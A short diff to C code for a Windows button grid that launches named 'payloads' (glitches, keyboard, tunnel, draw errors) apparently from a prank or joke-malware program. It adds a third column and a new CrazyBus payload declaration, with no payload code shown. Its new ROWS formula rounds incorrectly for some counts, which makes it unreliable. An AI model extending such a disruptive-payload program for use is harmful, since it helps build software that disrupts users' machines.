@@ -11,8 +11,8 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 // Window attributes
 #define BTNWIDTH 200
 #define BTNHEIGHT 30
-#define COLUMNS 2
-#define ROWS nPayloads/COLUMNS
+#define COLUMNS 3
+#define ROWS ((nPayloads + nPayloads%COLUMNS)/COLUMNS)
 #define SPACE 10
 #define WINDOWWIDTH COLUMNS * BTNWIDTH + (COLUMNS + 1)*SPACE
 #define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 32
@@ -62,3 +62,4 @@ PAYLOADFUNCTIONVISUAL(payloadGlitches);
 PAYLOADFUNCTIONDEFAULT(payloadKeyboard);
 PAYLOADFUNCTIONVISUAL(payloadTunnel);
 PAYLOADFUNCTIONVISUAL(payloadDrawErrors);
+PAYLOADHOST(payloadHostCrazyBus);
